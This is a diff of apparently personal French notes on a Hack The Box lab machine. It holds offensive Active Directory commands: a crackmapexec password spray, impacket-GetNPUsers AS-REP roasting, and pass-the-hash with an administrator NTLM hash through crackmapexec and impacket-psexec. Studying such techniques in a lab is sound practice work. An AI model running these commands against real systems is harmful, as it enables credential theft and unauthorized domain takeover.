@@ -51,7 +51,7 @@ password spray avec crackmapexec
 
 crackmapexec smb 10.10.10.161 -u 'user.lst' -p 'passwd.lst'
 
-/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/
+/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/       :white_check_mark:
 
 /usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/ -format hashcat
 
@@ -129,8 +129,7 @@ crackmapexec smb 10.10.10.161 -u 'administrator' -H 32693b11e6aa90eb43d32c72a07c
 
 /usr/bin/impacket-psexec -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
 
-
-
+# ${{\color{purple}Points of Improvement}}\ $
 
 -note ne pas oublier / dans impacket 
 /usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/
